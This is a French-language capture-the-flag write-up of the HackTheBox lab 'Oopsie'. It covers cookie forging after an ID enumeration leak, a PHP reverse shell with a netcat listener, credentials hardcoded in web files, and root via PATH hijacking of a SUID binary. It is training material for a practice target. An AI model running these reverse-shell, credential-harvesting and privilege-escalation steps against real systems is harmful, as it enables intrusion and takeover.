## Lab Title: Oopsie
- Date: 2025-09-24
- Duration: ~120 minutes

### Platform: HTB – Starting Point > Tier 2o

### 1. Scenario Summary
1. Le site web avec `disclosure vulnerabilité` >> la modification de `cookie`
2. `Lateral Movement` avec l'utilisateur et chercher son groupe et trouver le binaire avec **SUID** privilège.
3. Tout le monde peut exécuter ce binaire avec les privilèges du `propriétaire` (souvent: root)
4. La vulnerabilité avec le programme: `cat` sans chemin absolu est exploité.
5. Voilà

### 2. Findings
1. Pour intercepter le `trafic Web` , on peut utiliser l'outil: `Proxy` de `Burp Suite`

**Utilisant Web Proxies:**
2. Pour ça, j'ai utilisé l'outil: `gobuster` mais pas efficace:
    - `gobuster dir -u http://$ip -w /usr/share/seclists/.... -x txt,php -o output_file`

    - J'ai dû utiliser l'autre methode:
        - La configuration propre de `Proxy` dans `Firefox`: `127.0.0.1` et port `8080`
        - Pour cette connexion, j'ai utilisé `Burp Suite` pour analyser tous les trafics
        - Désactiver l'interception dans `Burp Suite`
        - J'ai trouvé l'information interresantes: sous le colonne: **Target**:
            - `/cdn-cgi/login/script.js`  >> La page de `Login`
    - **Il y a Uploads** page: c'est intéressant pour nous
    - Pour avoir l'accès au **Uploads** >> on a besoin de privilèges d' `Super Admin`:

3. Le **cookie** >> Les données de l'utilisateur stockées par le `serveur Web` dans le `Browser`
    - Dans le Browser `Mozilla Firefox`, c'est possible de voir et modifier les `cookies` avec `les outils de Développeur`
    - `Right Click` >> choisir `Inspect (Q)` dans la certaine page.
    - `Storage` où les cookies sont stockées

4. On a trouvé que: on peut faire l'enumeration avec `id`
    - `http://10.129.54.230/cdn-cgi/login/admin.php?content=accounts&id=2` >> rien
    - `http://10.129.54.230/cdn-cgi/login/admin.php?content=accounts&id=1` >> **les données d'Admin**
    ```code
        Access ID	Name	Email
            34322	admin	admin@megacorp.com
    ```
    - Après, j'ai changé les info dans le `cookie`: `role >> admin` et `user >> 34322`
    - Maintenant, on a les privilèges de l'Admin: et on peut faire `uploads`

**Foothold:**
5. On doit préparer le fichier: `php reverse shell` qu'on peut trouver `/usr/share/webshells`
    - On sélectionne: `php-reverse-shell.php` >> ici on a changé l'IP et port de mon machine.
    - Après, on a téléchargé ce fichier
    - Alors, maintenant, on doit savoir où est le fichier exactement

    - Pour ça, on doit utiliser l'outil: `gobuster`:
        - `gobuster dir -u http://10.129.54.230 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php`
        - L'outil: `gobuster` a montré qu'il y a un dossier: **/uploads** >> c'est confirmé

6. Quand, on a essayé d'ouvrir la page: `http://10.129.54.230/uploads` >> c'est interdit pour nous
    - Maintenant, on fait: `nc -lvnp 5642` pour son `php-reverse-shell.php` >> **NetCat Listener**
    - Pour faire une demande, on utilise: `http://$ip/uploads/php-reverse-shell.php`
    - On a obtenu le `reverse shell`  >> pour obtenir le meilleur shell >> on fait: `python3 -c 'import.pty;pty.spawn("/bin/bash")`

**Lateral Movement:**
7. Quand on exécuté `whoami` >> on a trouvé que: l'utilisateur: `www-data` >> ce ne suffit pas pour nous pour faire beacoup de choses:
    - Dans cet emplacement: `/var/www/html/cdi-cgn/login` on a trouvé les fichier et donc on doir rechercher l'autre `passwords`:
        - `cat * | grep -i passw*`
        ```code
            if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
            <input type="password" name="password" placeholder="Password" />
        ```
        - On a trouvé le mot de passe: `MEGACORP_4dm1n!!`
    - Pour trouver quelqu'un l'utilisateur: on a vérifié `/etc/passwd` >> on a trouvé l'utilisateur: `robert`
    - Mais, le mot de passe: `MEGACORP_4dm1n!!` n'est pas le sien, `robert`

    - Quand, on a vérifié `db.php` >> on a trouvé:
    ```code
        <?php
        $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
        ?>
    ```
    - Voilà, le mot de passe:`M3g4C0rpUs3r!` pour l'utilisateur: `robert`

**Privelege Escalation:**
8. Quand on a vérifié: `id`: on a trouvé que: l'utilisateur `robert` est une partie du group: `bugtracker`
    - Après, on doit faire quelque de chose: `find / -group bugtracker 2>/dev/null`
        - Avec cette commande >> on analysé si'il y quelque `binary` dans ce group: `bugtracker`
        - Et on a trouvé cela: `/usr/bin/bugtracker`
        - On doit vérifier les privilèges de ce binary: `ls -la`
            - `-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker`
            - Il a **s** drapeau: **setuid >> SUID** >> ça veut dire que le propriétaire du fichier peut exécuter:
            - Le propriétaire est `root`

9. SUID >> `Set Owner User ID`

10. `cat` >> binary est utilisé mais n'est pas specifié, donc on peut changer son comportement
    - On a créé le `cat` dans le `tmp` dossier `/tmp/cat` >> son contenu est `/bin/sh` >> faire le executable: `chmod +x cat`
    - `export PATH=/tmp:$PATH` >> mettre a jour >> `$PATH`

11. Pour `user flag` >> `/home/robert/user.txt` >> Voilà

12. On a exécuté la commande d'emplacement: `/tmp`: `bugtracker` >> Voilà >> on a obtenu les privilèges de l'utilisateur: `root`
    - Le drapeau est dans `/root` >> `root.txt`

## 3. Idea
- Le binary `cat` est utilisé:
    ```code
        Un binaire SUID s’exécute avec les droits de son propriétaire (souvent root).
        S’il appelle `cat` sans chemin absolu, l’OS le cherche dans `$PATH`.
        En plaçant dans `/tmp` un `cat` malveillant qui lance `/bin/sh` et en mettant `/tmp` en tête de `$PATH`,
        le SUID exécute ce `cat` — et donc ouvre un shell avec les droits root.
    ```
- Voilà, ça y est, c'est fini: `https://labs.hackthebox.com/achievement/machine/2118023/288`
